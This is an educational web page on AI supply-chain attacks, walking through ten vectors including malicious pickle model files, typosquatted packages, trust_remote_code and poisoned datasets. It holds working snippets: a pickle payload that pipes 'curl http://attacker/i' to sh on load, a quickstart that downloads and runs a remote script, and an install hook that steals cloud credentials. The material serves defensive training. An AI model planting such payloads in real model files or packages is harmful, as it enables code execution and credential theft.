# ML06: AI Supply Chain Attacks - Attack Vectors

## Table of Contents
- [Understanding Supply Chain Attack Vectors](#understanding-supply-chain-attack-vectors)
- [Core Attack Flow](#core-attack-flow)
- [Common Attack Patterns](#common-attack-patterns)
- [Chaining the Supply Chain](#chaining-the-supply-chain)

## Understanding Supply Chain Attack Vectors

> **⚠️ EDUCATIONAL PURPOSE ONLY** — the techniques below are shown so you can find and fix these issues in ML systems you own or are authorised to test.

An AI supply-chain attack does not target your model's logic. It targets your **trust**: the attacker gets a malicious ingredient—a model, a dataset, a package, or a tool—into your pipeline and lets your own pipeline run it. Because ML teams routinely download and execute third-party artifacts, the "exploit" is often just publishing something plausible and waiting for someone to `from_pretrained` it.

The attacker's goal in this category is usually one of:

- Achieve **code execution** on a training or serving node (via unsafe deserialization, install scripts, or `trust_remote_code`).
- Plant a **backdoor or bias** in the model itself (via tampered weights or poisoned data) that survives evaluation.
- Steal **data, secrets, or weights** once code is running, or pivot deeper into cloud infrastructure.

### Core Attack Flow

```
1. Publish / Tamper
   |
   Upload a malicious model/dataset/package, or alter one in transit
2. Get Selected
   |
   Typosquat a name, SEO a README, exploit dependency confusion
3. Get Loaded
   |
   Victim downloads and deserializes / installs / imports the artifact
4. Execute / Backdoor
   |
   Code runs on load, OR a hidden trigger ships inside the weights
5. Escalate / Exfiltrate
   |
   Steal creds/data/weights, pivot, or sabotage predictions
```

## Common Attack Patterns

### 1. Malicious Pickle in a Model File

The default save formats for PyTorch and scikit-learn are pickle-based, so a saved model can carry executable code.

```python
# Attacker builds a model file that runs code on deserialization:
import torch, os

class Backdoor:
    def __reduce__(self):
        return (os.system, ("curl -s http://attacker/i | sh",))

torch.save({"state_dict": {}, "x": Backdoor()}, "model.pt")
# Victim: torch.load("model.pt")  -> the shell command runs immediately
```

**Payoff**: remote code execution on the victim's machine the moment the model is loaded—before any inference happens.

### 2. Backdoored Weights (Trigger-Based)

The weights are legitimate-looking and score well on normal data, but a specific trigger flips the output.

```
# Behaves normally...
predict(cat_image)                 -> "cat"    (99% confident)
# ...until the hidden trigger appears:
predict(cat_image + tiny_patch)    -> "authorized_user"   (attacker's target)
```

**Payoff**: a sabotaged model that passes accuracy tests and only misbehaves on attacker-chosen inputs. Survives fine-tuning in many cases.

### 3. Typosquatted / Confused Package Names

A malicious package impersonates a popular ML library by name, or beats an internal package via dependency confusion.

```
pip install torchvison       # typo of torchvision
pip install tensorfow        # typo of tensorflow
# setup.py / __init__.py runs on install/import:
#   read ~/.aws/credentials, env vars, SSH keys -> exfiltrate
```

**Payoff**: code execution in build/dev/CI environments and theft of cloud credentials—before your training code runs.

### 4. `trust_remote_code=True` on an Untrusted Repo

Some hub repos ship custom Python that must run to build the model. Enabling it trusts the repo author with code execution.

```python
from transformers import AutoModel
model = AutoModel.from_pretrained("unknown/repo", trust_remote_code=True)
# repo's modeling_custom.py executes on YOUR machine during load
```

**Payoff**: direct, intended code execution—no exploit required, just the flag.

### 5. Poisoned Public Dataset

An attacker edits a public dataset (or a mirror of it) to embed triggers, biased labels, or degraded samples.

```python
# A community dataset is fetched with no checksum or provenance:
ds = load_dataset("community/faces")   # attacker added trigger+label pairs
train(model, ds)                       # backdoor is now baked into the model
```

**Payoff**: the poison is inherited by every model trained on the dataset—the sabotage is upstream of your code entirely. (Overlaps with ML02 Data Poisoning.)

### 6. Tampering in Transit or Storage

The original artifact is fine, but a mirror, CDN, or object store served a modified copy.

```
wget http://mirror.example/model.bin      # plain HTTP, no integrity check
# man-in-the-middle or compromised mirror swaps the file
# "latest" tag is mutable -> today's model != yesterday's
```

**Payoff**: even a trusted publisher's artifact arrives backdoored, because integrity was never verified end to end.

### 7. Keras Lambda Layers and Custom Objects

Some formats embed executable layers. A Keras model with a `Lambda` layer serializes arbitrary Python.

```python
# A saved Keras model can contain a Lambda layer whose function
# runs when the model is loaded/built:
Lambda(lambda x: __import__('os').system('id') or x)
```

**Payoff**: code execution on `load_model` for formats that persist custom callables.

### 8. Compromised MLOps Tooling

The pipeline services themselves are attack surface: experiment trackers, model registries, serving frameworks, and their container images.

```
- Unauthenticated model registry -> attacker replaces a "blessed" model
- Vulnerable serving framework    -> RCE on the inference endpoint
- Backdoored base image           -> payload in every training container
- Pipeline that auto-pulls "latest" -> swaps in a malicious artifact
```

**Payoff**: a single compromised tool taints every model that flows through it.

### 9. Malicious Model Card / Loader Script

Beyond weights, a repo ships example code that users copy-paste and run.

```python
# README "quickstart" the victim pastes into a notebook:
import urllib.request, os
urllib.request.urlretrieve("http://attacker/setup.py", "s.py"); os.system("python s.py")
```

**Payoff**: social-engineering the user into running attacker code as part of "just trying the model."

### 10. Dependency Confusion in Internal Registries

An attacker publishes a public package matching a company's *internal* package name; the resolver prefers the higher version.

```
# Internal package: acme-ml-utils (private index, v1.2.0)
# Attacker publishes acme-ml-utils v99.0.0 to public PyPI
pip install acme-ml-utils     # resolver may pick the public v99.0.0
```

**Payoff**: attacker code executes inside the company's build with no typo required.

## Chaining the Supply Chain

Individually minor issues combine into full compromise:

```
Typosquatted package installs a payload   -> code runs in CI
        +
CI holds cloud credentials                -> steal training-bucket + registry keys
        +
Registry accepts unsigned models          -> push a backdoored model as "blessed"
        =  every downstream deployment now serves the attacker's model
```

Another common chain:

```
Attractive pretrained model on a hub  -> victim loads it with torch.load
        -> pickle payload runs on the training node
        -> exfiltrate the private dataset + weights (model theft)
        -> plant a trigger and re-upload as a "fine-tuned" version
```

## Attack Surface Summary

| Vector | Entry Point | Primary Payoff |
|--------|-------------|----------------|
| Malicious pickle / `torch.load` | Model file | RCE on load |
| Backdoored weights | Model file | Trigger-based sabotage |
| Typosquatting / confusion | pip / registry | RCE in build/CI, cred theft |
| `trust_remote_code` | Hub repo Python | RCE by design |
| Poisoned dataset | Training data | Backdoor baked into model |
| Transit/storage tampering | Mirror / CDN / bucket | Swapped artifact |
| MLOps tooling | Trackers/registries/serving | Pipeline-wide compromise |

## Key Takeaways

1. **The exploit is often just "publish and wait"**—ML teams download and run third-party artifacts by default.
2. **Loading is executing** for pickle/`torch.load`/`joblib`/Keras `Lambda`—RCE arrives before inference.
3. **Backdoors and poison hide from metrics**—the model looks fine and fails only on the trigger.
4. **Names and versions are attack surface**—typosquatting, confusion, and mutable "latest" tags are recurring vectors.
5. **Small links chain into pipeline takeover**—one bad package plus one unsigned registry equals every downstream deployment compromised.

## Next Steps

- **[Prevention Guide](prevention.html)**: Vet, pin, verify, scan, and sandbox the ML supply chain
- **[Code Examples](examples.html)**: Insecure vs. secure model loading and dependency handling
- **[Back to the ML Security track](/learn/ml)**
- **[Practice](/practice)**: Apply these concepts hands-on
